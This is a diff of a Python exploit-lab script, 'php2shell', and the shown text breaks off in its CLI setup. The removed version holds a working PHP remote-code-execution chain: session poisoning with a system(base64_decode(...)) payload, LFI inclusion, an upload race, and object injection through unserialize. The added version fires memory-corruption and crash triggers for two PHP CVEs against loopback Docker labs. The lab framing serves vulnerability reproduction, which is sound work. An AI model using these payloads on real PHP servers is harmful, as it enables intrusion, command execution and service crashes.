@@ -1,672 +1,440 @@
 #!/usr/bin/env python3
-"""php2shell test - PHP session-poisoning lab + exploit chains.
+"""php2shell — reproducible labs for CVE-2026-109619 and CVE-2026-109618.
 
-Runtime deps: python3 stdlib + docker compose. Lab files are rendered from
-templates/ into lab/ (gitignored, regenerated with --regen).
+109619  Stale global state. A multipart body is parsed in php_hash_environment()
+        before PHP_RINIT_FUNCTION(basic). If serialising the upload-progress
+        session data exhausts memory_limit, the fatal bails out before RINIT, so
+        BG(serialize) keeps level=1 and a pointer to a context that request
+        shutdown frees. The next request on the same worker reuses it as a live
+        HashTable. Ported from RemiPelloux/php-session-upload-progress-uaf.
 
-Chains:
-  rce       session fixation + filename injection -> LFI include -> command exec
-  race      same poison, but the include fires while the upload is still
-            streaming: works with the stock session.upload_progress.cleanup=On
-  mismatch  php_serialize writer + php reader -> injected object instantiated
-            (proven by a __destruct marker file inside the php container)
-  uaf       unserialize() var_destroy/__destruct reentry read-after-free,
-            ASAN-confirmed on stock PHP 8.2.34
+109618  OOM corruption. Handling OOM with longjmp during request startup leaves
+        partially initialised request memory behind; shutdown then reads or
+        branches on it. Vectors follow the PHP advisory: multipart headers whose
+        in-memory representation dwarfs their wire size, deeply nested field
+        names, and bodies without a usable Content-Length.
 
-Authorized testing against infrastructure you own only.
+Both labs build 8.5.11 (vulnerable) and 8.5.12 (fixed) from the same source and
+flags, so a behavioural difference is a PHP difference.
+
+Commands:
+  up [--only 109619|109618]   build and start the lab(s)
+  down                        stop and remove
+  109619 [--php V] [--control]
+  109618 [--php V] [--vector headers|nested|chunked] [--repeat N]
+  verify [--all]              run the positive/negative matrix
+
+Loopback only. Run against infrastructure you own.
 """
 
 from __future__ import annotations
 
 import argparse
-import base64
-import contextlib
 import hashlib
 import http.client
-import logging
-import os
-import re
+import io
 import secrets
 import shutil
 import socket
 import subprocess
 import sys
-import threading
 import time
-import urllib.parse
 from pathlib import Path
-from string import Template
 
-HERE = Path(__file__).resolve().parent
-LAB = HERE / "lab"
-TEMPLATES = HERE / "templates"
 HOST = "127.0.0.1"
-DEFAULT_PORT = 18081
-SESSIONS = "/tmp/sessions"
-GADGET_MARKER = "/tmp/gadget-hit"
-PORT_FILE = LAB / ".http-port"
+BASE = Path(__file__).resolve().parent
+LAB = BASE / "lab"
+TEMPLATES = BASE / "templates"
+BOUNDARY = "----php2shellboundary"
 
-SID_RE = re.compile(r"^[A-Za-z0-9,-]{1,128}$")
-CLASS_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*$")
-READY_MARK = "lab ready"
+PROJECT = "php2shell-" + hashlib.sha1(str(BASE).encode()).hexdigest()[:8]
 
-log = logging.getLogger("php2shell")
-
-
-class LabError(RuntimeError):
-    """A user-facing failure (bad input, missing lab, docker error)."""
-
-
-# --------------------------------------------------------------------------
-# compose plumbing
-# --------------------------------------------------------------------------
-def project_name() -> str:
-    """Per-checkout compose project name, so parallel clones never collide."""
-    override = os.environ.get("PHP2SHELL_PROJECT")
-    if override:
-        return override
-    digest = hashlib.sha1(str(HERE).encode()).hexdigest()[:8]
-    return f"php2shell-{digest}"
+PORTS = {
+    ("109619", "8.5.11"): 18119,
+    ("109619", "8.5.12"): 18120,
+    ("109618", "8.5.11"): 18118,
+    ("109618", "8.5.12"): 18117,
+}
+SERVICES = {
+    ("109619", "8.5.11"): "php8511",
+    ("109619", "8.5.12"): "php8512",
+    ("109618", "8.5.11"): "apache8511",
+    ("109618", "8.5.12"): "apache8512",
+}
+VERSIONS = ("8.5.11", "8.5.12")
 
 
-def _run(
-    args: list[str],
-    *,
-    input_bytes: bytes | None = None,
-    text: bool = True,
-    check: bool = True,
-    timeout: float = 60,
-) -> subprocess.CompletedProcess:
-    cmd = ["docker", *args]
-    log.debug("run: %s", " ".join(cmd))
-    try:
-        proc = subprocess.run(
-            cmd,
-            cwd=LAB,
-            input=input_bytes,
-            capture_output=True,
-            timeout=timeout,
-        )
-    except FileNotFoundError as exc:
-        raise LabError("docker is not installed or not on PATH") from exc
-    except subprocess.TimeoutExpired as exc:
-        raise LabError(f"docker command timed out after {timeout:.0f}s: {' '.join(cmd)}") from exc
-    out: str | bytes = proc.stdout.decode("utf-8", "replace") if text else proc.stdout
-    err: str | bytes = proc.stderr.decode("utf-8", "replace") if text else proc.stderr
-    if check and proc.returncode != 0:
-        detail = err if isinstance(err, str) else err.decode("utf-8", "replace")
-        raise LabError(f"command failed ({proc.returncode}): {' '.join(cmd)}\n{detail.strip()}")
-    return subprocess.CompletedProcess(proc.args, proc.returncode, out, err)
-
-
-def compose(*args: str, **kwargs) -> subprocess.CompletedProcess:
-    if not (LAB / "docker-compose.yml").is_file():
-        raise LabError(f"lab/ is not generated yet: run '{script_name()} gen' or 'up' first")
-    return _run(["compose", "--project-name", project_name(), *args], **kwargs)
-
-
-# --------------------------------------------------------------------------
-# lab rendering
-# --------------------------------------------------------------------------
-def _render(path: Path, **values: object) -> str:
-    return Template(path.read_text(encoding="utf-8")).substitute(**values)
-
-
-def _display_path(path: Path) -> str:
-    try:
-        return str(path.relative_to(HERE))
-    except ValueError:
-        return str(path)
-
-
-def generate_lab(http_port: int, *, regen: bool = False) -> list[Path]:
-    """Render templates/ into lab/. Existing files are kept unless regen=True."""
-    if not TEMPLATES.is_dir():
-        raise LabError(f"missing templates directory: {TEMPLATES}")
-    LAB.mkdir(parents=True, exist_ok=True)
-    written: list[Path] = []
-
-    for src in sorted(TEMPLATES.rglob("*")):
-        if not src.is_file():
-            continue
-        rel = src.relative_to(TEMPLATES)
-        dst = LAB / rel
-        if src.suffix == ".yml":
-            # Compose file is pure template output (it carries the HTTP port),
-            # so it is rewritten whenever the rendered content changes.
-            rendered = _render(src, HTTP_PORT=http_port)
-            if dst.is_file() and dst.read_text(encoding="utf-8") == rendered:
-                continue
-            dst.parent.mkdir(parents=True, exist_ok=True)
-            dst.write_text(rendered, encoding="utf-8")
-            written.append(dst)
-            continue
-        if dst.exists() and not regen:
-            continue
-        dst.parent.mkdir(parents=True, exist_ok=True)
-        shutil.copyfile(src, dst)
-        written.append(dst)
-
-    PORT_FILE.write_text(f"{http_port}\n", encoding="utf-8")
-    if written:
-        log.info(
-            "lab files %s: %s",
-            "regenerated" if regen else "created",
-            ", ".join(_display_path(p) for p in written),
-        )
-    else:
-        log.info("lab files already present (use --regen to overwrite)")
-    return written
-
-
-def resolve_port(explicit: int | None) -> int:
-    if explicit:
-        return explicit
-    env = os.environ.get("PHP2SHELL_HTTP_PORT")
-    if env:
-        try:
-            return int(env)
-        except ValueError as exc:
-            raise LabError(f"PHP2SHELL_HTTP_PORT is not an integer: {env!r}") from exc
-    if PORT_FILE.is_file():
-        raw = PORT_FILE.read_text(encoding="utf-8").strip()
-        if raw.isdigit():
-            return int(raw)
-    return DEFAULT_PORT
-
-
-# --------------------------------------------------------------------------
+# ---------------------------------------------------------------------------
 # lab lifecycle
-# --------------------------------------------------------------------------
-def lab_up(http_port: int, *, regen: bool) -> None:
-    generate_lab(http_port, regen=regen)
-    log.info("starting lab (project %s, http %s:%d)", project_name(), HOST, http_port)
-    # Always recreate: lab/ is regenerated from templates and may have been
-    # deleted behind a running container (stale bind mount) or edited in place
-    # (php.ini). Recreating keeps the containers identical to what is on disk.
-    proc = compose(
-        "up",
-        "-d",
-        "--wait",
-        "--wait-timeout",
-        "180",
-        "--force-recreate",
-        check=False,
-        timeout=300,
+# ---------------------------------------------------------------------------
+def render() -> None:
+    if LAB.exists():
+        shutil.rmtree(LAB)
+    LAB.mkdir(parents=True)
+    for name in ("Dockerfile.cli", "Dockerfile.apache", "apache.conf", "compose.yml"):
+        shutil.copy2(TEMPLATES / name, LAB / name)
+    webroot = LAB / "webroot"
+    if webroot.exists():
+        shutil.rmtree(webroot)
+    shutil.copytree(TEMPLATES / "webroot", webroot)
+
+
+def compose(*args: str, check: bool = True, timeout: int = 3600) -> subprocess.CompletedProcess:
+    cmd = ["docker", "compose", "-p", PROJECT, "-f", str(LAB / "compose.yml"), *args]
+    res = subprocess.run(cmd, cwd=LAB, text=True, capture_output=True, timeout=timeout)
+    if check and res.returncode != 0:
+        tail = (res.stderr or res.stdout).strip().splitlines()[-6:]
+        raise SystemExit("docker compose " + " ".join(args) + " failed:\n  " + "\n  ".join(tail))
+    return res
+
+
+def up(only: str | None = None) -> None:
+    render()
+    profiles = ["--profile", only] if only else ["--profile", "109619", "--profile", "109618"]
+    print("building images (first run compiles PHP twice per version, be patient)")
+    compose(*profiles, "up", "-d", "--build", "--force-recreate", "--wait", timeout=5400)
+    for (lab, php), port in PORTS.items():
+        if only is None or lab == only:
+            print(f"[+] {lab} PHP {php}: http://{HOST}:{port}")
+
+
+def down() -> None:
+    compose("down", "-v", "--remove-orphans", check=False)
+
+
+def cid(service: str) -> str:
+    out = compose("ps", "-a", "-q", service, check=False).stdout.strip()
+    return out.splitlines()[0] if out else ""
+
+
+def running(service: str) -> bool:
+    c = cid(service)
+    if not c:
+        return False
+    res = subprocess.run(
+        ["docker", "inspect", "-f", "{{.State.Running}}", c],
+        text=True,
+        capture_output=True,
+        timeout=30,
     )
-    if proc.returncode != 0:
-        logs = compose("logs", "--no-color", "--tail", "40", check=False, timeout=60)
-        raise LabError(
-            "docker compose up failed; last log lines:\n" + (logs.stdout + logs.stderr).strip()
-        )
-    print(f"[+] {READY_MARK}: http://{HOST}:{http_port}  (sessions {SESSIONS})")
+    return res.stdout.strip() == "true"
 
 
-def lab_down() -> None:
-    if not (LAB / "docker-compose.yml").is_file():
-        log.info("nothing to do: lab/ is not generated")
+def exit_code(service: str) -> str:
+    c = cid(service)
+    if not c:
+        return "?"
+    res = subprocess.run(
+        ["docker", "inspect", "-f", "{{.State.ExitCode}}", c],
+        text=True,
+        capture_output=True,
+        timeout=30,
+    )
+    return res.stdout.strip() or "?"
+
+
+def logs(service: str, tail: int = 60) -> str:
+    res = compose("logs", "--no-color", "--tail", str(tail), service, check=False)
+    return res.stdout + res.stderr
+
+
+def ensure_running(service: str) -> None:
+    if running(service):
         return
-    compose("down", "-v", "--remove-orphans", timeout=180)
-    print("[+] lab stopped")
+    compose("up", "-d", service, timeout=900)
+    for _ in range(60):
+        c = cid(service)
+        if c:
+            fmt = "{{if .State.Health}}{{.State.Health.Status}}{{end}}"
+            res = subprocess.run(
+                ["docker", "inspect", "-f", fmt, c],
+                text=True,
+                capture_output=True,
+                timeout=30,
+            )
+            if res.stdout.strip() == "healthy":
+                return
+        time.sleep(1)
+    raise SystemExit(f"{service} did not become healthy; see `docker compose logs {service}`")
 
 
-def require_running() -> None:
-    proc = compose("ps", "--status", "running", "-q", "php", check=False)
-    if not proc.stdout.strip():
-        raise LabError(f"lab is not running: run '{script_name()} up' first")
+# ---------------------------------------------------------------------------
+# wire format
+# ---------------------------------------------------------------------------
+def part(name: str, value: str) -> bytes:
+    return (
+        f'--{BOUNDARY}\r\nContent-Disposition: form-data; name="{name}"\r\n\r\n{value}\r\n'
+    ).encode()
 
 
-def exec_php(*args: str, input_bytes: bytes | None = None) -> str:
-    proc = compose("exec", "-T", "php", *args, input_bytes=input_bytes, timeout=120)
-    return proc.stdout
+def file_part(name: str, filename: str, data: bytes = b"Z") -> bytes:
+    return (
+        (
+            f'--{BOUNDARY}\r\nContent-Disposition: form-data; name="{name}"; '
+            f'filename="{filename}"\r\nContent-Type: application/octet-stream\r\n\r\n'
+        ).encode()
+        + data
+        + b"\r\n"
+    )
 
 
-def exec_php_bytes(*args: str) -> bytes:
-    proc = compose("exec", "-T", "php", *args, text=False, timeout=120)
-    return proc.stdout
+def closing() -> bytes:
+    return f"--{BOUNDARY}--\r\n".encode()
 
 
-def session_file(sid: str) -> bytes | None:
-    proc = compose("exec", "-T", "php", "cat", f"{SESSIONS}/sess_{sid}", text=False, check=False)
-    return proc.stdout if proc.returncode == 0 else None
-
-
-# --------------------------------------------------------------------------
-# HTTP helpers (http.client: real framing, chunked decode, no string surgery)
-# --------------------------------------------------------------------------
-def _param(value: str) -> str:
-    """Escape a Content-Disposition parameter; reject CR/LF and non-ASCII."""
-    if "\r" in value or "\n" in value:
-        raise LabError("CR/LF is not allowed in multipart parameters")
-    try:
-        value.encode("ascii")
-    except UnicodeEncodeError as exc:
-        raise LabError("multipart parameters must be ASCII") from exc
-    return value.replace("\\", "\\\\").replace('"', '\\"')
-
-
-def build_multipart(filename: str, sid: str, boundary: str | None = None) -> tuple[bytes, str]:
-    """Return (body, boundary) for the upload_progress poisoning request."""
-    boundary = boundary or secrets.token_hex(16)
-    if not boundary.isascii() or not boundary:
-        raise LabError("invalid multipart boundary")
-    parts = [
-        f'--{boundary}\r\nContent-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n',
-        f"--{boundary}\r\nContent-Disposition: form-data; "
-        f'name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n',
-        f"--{boundary}\r\nContent-Disposition: form-data; "
-        f'name="f"; filename="{_param(filename)}"\r\n'
-        f"Content-Type: application/octet-stream\r\n\r\nZ\r\n",
-        f"--{boundary}--\r\n",
-    ]
-    body = "".join(parts).encode("utf-8")
-    return body, boundary
-
-
-def _connect(http_port: int, timeout: float = 15) -> http.client.HTTPConnection:
-    return http.client.HTTPConnection(HOST, http_port, timeout=timeout)
+def content_type() -> str:
+    return f"multipart/form-data; boundary={BOUNDARY}"
 
 
 def post(
-    http_port: int,
-    path: str,
-    *,
-    filename: str,
-    sid: str,
-    cookie: bool = True,
+    port: int, body: bytes, path: str = "/probe.php", timeout: int = 30, sid: str | None = None
 ) -> tuple[int, bytes]:
-    body, boundary = build_multipart(filename, sid)
-    headers = {
-        "Content-Type": f"multipart/form-data; boundary={boundary}",
-        "Content-Length": str(len(body)),
-    }
-    if cookie:
+    headers = {"Content-Type": content_type(), "Content-Length": str(len(body))}
+    if sid:
         headers["Cookie"] = f"PHPSESSID={sid}"
-    conn = _connect(http_port)
+    conn = http.client.HTTPConnection(HOST, port, timeout=timeout)
     try:
         conn.request("POST", path, body=body, headers=headers)
-        resp = conn.getresponse()
-        return resp.status, resp.read()
+        res = conn.getresponse()
+        return res.status, res.read()
     finally:
         conn.close()
 
 
-def get(http_port: int, path: str, *, sid: str | None = None) -> tuple[int, bytes]:
-    conn = _connect(http_port)
+def post_chunked(
+    port: int, chunks: list[bytes], path: str, timeout: int = 120
+) -> tuple[int, bytes]:
+    sock = socket.create_connection((HOST, port), timeout=timeout)
     try:
-        headers = {"Cookie": f"PHPSESSID={sid}"} if sid else {}
-        conn.request("GET", path, headers=headers)
-        resp = conn.getresponse()
-        return resp.status, resp.read()
-    finally:
-        conn.close()
-
-
-# --------------------------------------------------------------------------
-# payloads
-# --------------------------------------------------------------------------
-def validate_sid(sid: str) -> str:
-    if not SID_RE.match(sid):
-        raise LabError(
-            "--sid must match ^[A-Za-z0-9,-]{1,128}$ (it lands in a URL, "
-            "a cookie and a container path)"
+        sock.sendall(
+            (
+                f"POST {path} HTTP/1.1\r\nHost: {HOST}\r\n"
+                f"Content-Type: {content_type()}\r\n"
+                "Transfer-Encoding: chunked\r\nConnection: close\r\n\r\n"
+            ).encode()
         )
-    return sid
-
-
-def validate_class(name: str) -> str:
-    if not CLASS_RE.match(name):
-        raise LabError("--class must be a PHP identifier: ^[A-Za-z_][A-Za-z0-9_]*$")
-    return name
-
-
-def build_rce_payload(cmd: str) -> str:
-    """Base64 the command so the payload stays quote/backslash/CRLF-free."""
-    encoded = base64.b64encode(cmd.encode("utf-8")).decode("ascii")
-    return f"<?php echo 'POC-OUT['; system(base64_decode('{encoded}')); echo ']POC-OUT'; ?>"
-
-
-def build_injection(klass: str) -> str:
-    """php_serialize key|value fragment carrying an object of ``klass``."""
-    return f'x|O:{len(klass.encode("utf-8"))}:"{klass}":0:{{}}'
-
-
-# --------------------------------------------------------------------------
-# chains
-# --------------------------------------------------------------------------
-def chain_rce(cmd: str, sid: str, http_port: int) -> int:
-    payload = build_rce_payload(cmd)
-    post(http_port, "/app/upload.php", filename=payload, sid=sid)
-
-    data = session_file(sid)
-    if data is None:
-        print("[-] no session file was written; is the lab up?")
-        return 1
-    if payload.encode("utf-8") not in data:
-        print("[-] poison failed; session file:", repr(data[:300]))
-        return 1
-    print(f"[+] session file poisoned with a base64 payload ({len(data)} bytes)")
-
-    page = urllib.parse.quote(f"{SESSIONS}/sess_{sid}", safe="/")
-    status, body_bytes = get(http_port, f"/vuln.php?page={page}")
-    body = body_bytes.decode("utf-8", "replace")
-    if status == 200 and "POC-OUT[" in body:
-        out = body.split("POC-OUT[", 1)[1].split("]POC-OUT", 1)[0]
-        print(f"[+] RCE via include, cmd={cmd!r}:")
-        print(out.rstrip())
-        return 0
-    print(f"[-] include did not execute the payload (HTTP {status}):\n{body[:400]}")
-    return 1
-
-
-def build_stream_parts(filename: str, sid: str, size: int) -> tuple[bytes, bytes, int, str]:
-    """Multipart head/tail plus total length for a body of ``size`` filler bytes."""
-    boundary = secrets.token_hex(16)
-    head = (
-        f'--{boundary}\r\nContent-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
-        f"--{boundary}\r\nContent-Disposition: form-data; "
-        f'name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
-        f"--{boundary}\r\nContent-Disposition: form-data; "
-        f'name="f"; filename="{_param(filename)}"\r\n'
-        "Content-Type: application/octet-stream\r\n\r\n"
-    ).encode()
-    tail = f"\r\n--{boundary}--\r\n".encode()
-    return head, tail, len(head) + size + len(tail), boundary
-
-
-def set_lab_cleanup(value: str) -> str:
-    """Rewrite lab/php.ini's upload_progress.cleanup and return the old content."""
-    ini = LAB / "php.ini"
-    original = ini.read_text(encoding="utf-8")
-    updated = re.sub(
-        r"(?m)^session\.upload_progress\.cleanup\s*=.*$",
-        f"session.upload_progress.cleanup = {value}",
-        original,
-    )
-    if updated == original:
-        raise LabError("lab/php.ini has no session.upload_progress.cleanup line")
-    ini.write_text(updated, encoding="utf-8")
-    return original
-
-
-def chain_race(
-    cmd: str,
-    sid: str,
-    http_port: int,
-    size: int,
-    timeout: float,
-    stock_cleanup: bool,
-) -> int:
-    """Poison and include concurrently; the hit must land while bytes are in flight."""
-    if not 64 * 1024 <= size <= 7 * 1024 * 1024:
-        raise LabError("--size must be 64KiB..7MiB (PHP post_max_size defaults to 8M)")
-
-    payload = build_rce_payload(cmd)
-    original_ini: str | None = None
-    if stock_cleanup:
-        original_ini = set_lab_cleanup("On")
-        log.info("restarting php with session.upload_progress.cleanup=On (stock default)")
-        compose(
-            "up", "-d", "--wait", "--wait-timeout", "120", "--force-recreate", "php", timeout=180
-        )
-    try:
-        head, tail, total, boundary = build_stream_parts(payload, sid, size)
-        state: dict[str, object] = {"sent": len(head), "done": False, "error": None}
-
-        def upload() -> None:
-            try:
-                sock = socket.create_connection((HOST, http_port), timeout=60)
-                try:
-                    preamble = (
-                        "POST /app/upload.php HTTP/1.1\r\n"
-                        f"Host: {HOST}:{http_port}\r\n"
-                        f"Cookie: PHPSESSID={sid}\r\n"
-                        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
-                        f"Content-Length: {total}\r\n"
-                        "Connection: close\r\n\r\n"
-                    ).encode()
-                    sock.sendall(preamble + head)
-                    filler = b"A" * 65536
-                    end = len(head) + size
-                    while state["sent"] < end:  # type: ignore[operator]
-                        n = min(len(filler), end - state["sent"])  # type: ignore[operator]
-                        sock.sendall(filler[:n])
-                        state["sent"] = state["sent"] + n  # type: ignore[operator]
-                        time.sleep(0.02)
-                    sock.sendall(tail)
-                    state["sent"] = total
-                    with contextlib.suppress(OSError):
-                        sock.recv(65536)
-                finally:
-                    sock.close()
-            except OSError as exc:
-                state["error"] = str(exc)
-            finally:
-                state["done"] = True
-
-        thread = threading.Thread(target=upload, daemon=True)
-        thread.start()
-
-        page = urllib.parse.quote(f"{SESSIONS}/sess_{sid}", safe="/")
-        deadline = time.time() + timeout
-        probes = 0
-        while time.time() < deadline:
-            status, raw = get(http_port, f"/vuln.php?page={page}")
-            probes += 1
-            if b"POC-OUT[" in raw:
-                sent = int(state["sent"])  # type: ignore[arg-type]
-                out = raw.split(b"POC-OUT[", 1)[1].split(b"]POC-OUT", 1)[0]
-                print(f"[+] payload executed from the session file, cmd={cmd!r}:")
-                print(out.decode("utf-8", "replace").rstrip())
-                if sent < total:
-                    print(f"    in flight: {sent}/{total} bytes sent, {probes} probes")
-                    print("    -> the include won the race; cleanup=On does not stop it")
-                else:
-                    print(f"    after the upload ended ({probes} probes); cleanup is Off here")
-                return 0
-            if state["done"] and state["error"]:
+        for chunk in chunks:
+            sock.sendall(f"{len(chunk):x}\r\n".encode() + chunk + b"\r\n")
+        sock.sendall(b"0\r\n\r\n")
+        raw = b""
+        while True:
+            data = sock.recv(65536)
+            if not data:
                 break
-            time.sleep(0.05)
-        thread.join(timeout=5)
-        if state["error"]:
-            print(f"[-] upload failed: {state['error']}")
-        else:
-            print(
-                f"[-] no execution within {timeout:.0f}s "
-                f"({probes} probes, {state['sent']}/{total} bytes sent)"
-            )
-        return 1
+            raw += data
     finally:
-        if original_ini is not None:
-            (LAB / "php.ini").write_text(original_ini, encoding="utf-8")
-            compose(
-                "up",
-                "-d",
-                "--wait",
-                "--wait-timeout",
-                "120",
-                "--force-recreate",
-                "php",
-                check=False,
-                timeout=180,
-            )
+        sock.close()
+    head, _, body = raw.partition(b"\r\n\r\n")
+    status = head.split(b" ")[1] if head.count(b" ") >= 1 else b"0"
+    return int(status), body
 
 
-def chain_mismatch(klass: str, sid: str, http_port: int) -> int:
-    exec_php("rm", "-f", GADGET_MARKER)
-    injection = build_injection(klass)
-    post(http_port, "/app/upload.php", filename=injection, sid=sid)
+# ---------------------------------------------------------------------------
+# CVE-2026-109619
+# ---------------------------------------------------------------------------
+def arm_body(sid: str, filename_len: int) -> bytes:
+    return part("PHP_SESSION_UPLOAD_PROGRESS", sid) + file_part("f", "A" * filename_len) + closing()
 
-    data = session_file(sid)
-    if data is None:
-        print("[-] no session file was written; is the lab up?")
-        return 1
-    log.debug("session file: %r", data[:400])
 
-    # Plain GET: no upload_progress field, so session_start() runs inside the
-    # script (where class Gadget is already declared). A multipart POST here
-    # would start the session at RINIT, before any userland class exists.
-    status, raw = get(http_port, "/api/endpoint.php", sid=sid)
-    body = raw.decode("utf-8", "replace")
-    warned = "Failed to decode session object" in body
+def fire_body(sid: str) -> bytes:
+    return part("PHP_SESSION_UPLOAD_PROGRESS", sid) + closing()
 
-    marker = compose("exec", "-T", "php", "cat", GADGET_MARKER, check=False, timeout=30)
-    if marker.returncode == 0:
-        proof = marker.stdout.strip()
-        print(
-            f"[+] {klass} was instantiated in the api/ endpoint "
-            f"(__destruct marker: {GADGET_MARKER} -> {proof!r})"
-        )
-        if warned:
-            print("    (the session handler also reported a decode failure)")
-        print("    RCE requires a target class with an exploitable __destruct.")
-        return 0
 
-    if warned:
-        print(
-            "[-] handler mismatch produced a decode warning, but the injected "
-            "object was NOT instantiated (no marker file)."
-        )
-        print("    Treat 'Failed to decode session object' alone as inconclusive.")
+def chain_109619(php: str, control: bool = False, timeout: int = 30) -> int:
+    service = SERVICES[("109619", php)]
+    port = PORTS[("109619", php)]
+    ensure_running(service)
+
+    sid = secrets.token_hex(16)
+    filename_len = 2000 if control else 2_000_000
+    try:
+        st1, _ = post(port, arm_body(sid, filename_len), "/probe.php", sid=sid)
+        r1 = str(st1)
+    except (OSError, http.client.HTTPException) as exc:
+        r1 = f"error ({type(exc).__name__})"
+
+    died = False
+    try:
+        st2, _ = post(port, fire_body(sid), "/probe.php", timeout=timeout, sid=sid)
+        r2 = str(st2)
+    except (OSError, http.client.HTTPException) as exc:
+        r2 = f"connection died ({type(exc).__name__})"
+        died = True
+
+    time.sleep(0.4)
+    alive = running(service)
+    log = logs(service, 40)
+    corrupt = "zend_mm_heap corrupted" in log or "heap-use-after-free" in log
+    fired = died or not alive or corrupt
+
+    print(f"[*] CVE-2026-109619 PHP {php}{' (control)' if control else ''}")
+    print(f"    R1 arm   {r1}  filename={filename_len} bytes, memory_limit=8M")
+    print(f"    R2 fire  {r2}")
+    print(f"    worker   {'alive' if alive else 'dead (exit ' + exit_code(service) + ')'}")
+    for line in [ln for ln in log.splitlines() if "corrupt" in ln or "Fatal" in ln][-3:]:
+        print(f"    log      {line.strip()}")
+    print(f"    verdict  {'FIRED — stale serialize context reused' if fired else 'SURVIVED'}")
+    return 0 if fired else 1
+
+
+# ---------------------------------------------------------------------------
+# CVE-2026-109618
+# ---------------------------------------------------------------------------
+def headers_body(count: int) -> bytes:
+    buf = io.BytesIO()
+    buf.write(
+        f'--{BOUNDARY}\r\nContent-Disposition: form-data; name="f"; filename="x"\r\n'.encode()
+    )
+    for i in range(count):
+        buf.write(b"X-%d: a\r\n" % i)
+    buf.write(b"\r\n" + b"Z" * 1024 + b"\r\n")
+    buf.write(closing())
+    return buf.getvalue()
+
+
+def nested_body(depth: int, parts: int) -> bytes:
+    name = "a" + "[k]" * depth
+    buf = io.BytesIO()
+    for _ in range(parts):
+        buf.write(part(name, "v"))
+    buf.write(closing())
+    return buf.getvalue()
+
+
+def chain_109618(php: str, vector: str = "headers", repeat: int = 1, timeout: int = 120) -> int:
+    service = SERVICES[("109618", php)]
+    port = PORTS[("109618", php)]
+    ensure_running(service)
+    before = logs(service, 2000)
+
+    print(f"[*] CVE-2026-109618 PHP {php} vector={vector} repeat={repeat}")
+    statuses: list[str] = []
+    bodies: list[bytes] = []
+    died = False
+    for _ in range(repeat):
+        try:
+            if vector == "chunked":
+                chunk = b"A" * (1024 * 1024)
+                st, body = post_chunked(port, [chunk] * 48, "/index.php", timeout=timeout)
+            elif vector == "nested":
+                st, body = post(
+                    port, nested_body(depth=64, parts=800), "/index.php", timeout=timeout
+                )
+            else:
+                st, body = post(port, headers_body(200_000), "/index.php", timeout=timeout)
+            statuses.append(str(st))
+            bodies.append(body)
+        except (OSError, http.client.HTTPException) as exc:
+            statuses.append(f"died ({type(exc).__name__})")
+            died = True
+        time.sleep(0.3)
+
+    time.sleep(0.5)
+    new = logs(service, 4000)
+    delta = new[len(before) :] if new.startswith(before) else new
+    crash_markers = ("exit signal", "Segmentation fault", "Aborted", "zend_mm_heap corrupted")
+    crashed = any(m.lower() in delta.lower() for m in crash_markers)
+    oom = any(b"Allowed memory size" in body for body in bodies)
+    oom_only = oom and not crashed
+    alive = running(service)
+
+    print(f"    requests {', '.join(statuses)}")
+    print(f"    worker   {'alive' if alive else 'dead'}")
+    hits = [ln for ln in delta.splitlines() if any(m.lower() in ln.lower() for m in crash_markers)]
+    for line in hits[-3:]:
+        print(f"    log      {line.strip()[:160]}")
+    if crashed:
+        verdict = "CRASHED — request-startup OOM left invalid state behind"
+    elif oom_only:
+        verdict = "OOM ONLY — startup OOM reached, corruption not observed"
+    elif died:
+        verdict = "CONNECTION DIED — no crash marker in the log"
     else:
-        print(f"[-] no decode failure and no marker (HTTP {status}):\n{body[:400]}")
-    return 1
+        verdict = "CLEAN — no OOM, no crash"
+    print(f"    verdict  {verdict}")
+    return 0 if crashed else (2 if oom_only else 1)
 
 
-def check_uaf() -> int:
-    require_running()
-    trigger = (TEMPLATES / "uaf_trigger.php").read_bytes()
-    exec_php("sh", "-c", "cat > /tmp/uaf_trigger.php", input_bytes=trigger)
-    proc = compose(
-        "exec",
-        "-T",
-        "php",
-        "env",
-        "USE_ZEND_ALLOC=0",
-        "php",
-        "/tmp/uaf_trigger.php",
-        check=False,
-        timeout=120,
-    )
-    err = (proc.stderr or "").strip()
-    out = (proc.stdout or "").strip()
-    if out:
-        print(out)
-    if err:
-        print(err)
-    if "stale var_hash read" in (out + err):
-        print("[+] behavioral UAF confirmed on the stock build (stale R:1500 read).")
-        print("    ASAN proof needs a sanitizer build: CFLAGS='-fsanitize=address -g -O1'")
-        print("    LDFLAGS='-fsanitize=address', USE_ZEND_ALLOC=0 -> heap-use-after-free")
-        print("    READ at ext/standard/var_unserializer.c:850, freed at var_destroy:245.")
-        return 0
-    print("[-] no UAF behavior observed on this build.")
-    return 1
+# ---------------------------------------------------------------------------
+# verify
+# ---------------------------------------------------------------------------
+def verify(all_labs: bool = False) -> int:
+    rows: list[tuple[str, str, str, str, bool]] = []
+
+    got = chain_109619("8.5.11")
+    rows.append(("109619", "8.5.11", "FIRED" if got == 0 else "SURVIVED", "FIRED", got == 0))
+    got = chain_109619("8.5.12")
+    rows.append(("109619", "8.5.12", "FIRED" if got == 0 else "SURVIVED", "SURVIVED", got != 0))
+
+    if all_labs:
+        labels = {0: "CRASHED", 2: "OOM", 1: "CLEAN"}
+        got = chain_109618("8.5.11", "headers")
+        rows.append(("109618", "8.5.11", labels[got], "OOM", got == 2))
+        got = chain_109618("8.5.12", "headers")
+        rows.append(("109618", "8.5.12", labels[got], "CLEAN", got == 1))
+
+    print("\nlab      php      result      expected    pass")
+    ok = True
+    for lab, php, result, expected, passed in rows:
+        print(f"{lab:<8} {php:<8} {result:<11} {expected:<11} {'yes' if passed else 'NO'}")
+        ok = ok and passed
+    if all_labs:
+        print(
+            "\nnote: 109618 reproduces the pre-auth startup OOM on 8.5.11 and shows the fixed\n"
+            "      build no longer reaching it; the corruption/RCE is not reproduced."
+        )
+    return 0 if ok else 1
 
 
-# --------------------------------------------------------------------------
-# CLI
-# --------------------------------------------------------------------------
-def script_name() -> str:
-    return Path(sys.argv[0]).name
-
-
-def build_parser() -> argparse.ArgumentParser:
+# ---------------------------------------------------------------------------
+# cli
+# ---------------------------------------------------------------------------
+def main() -> int:
     ap = argparse.ArgumentParser(
-        prog=script_name(),
-        description=__doc__,
+        description="CVE-2026-109619 / CVE-2026-109618 labs (loopback only)",
         formatter_class=argparse.RawDescriptionHelpFormatter,
-    )
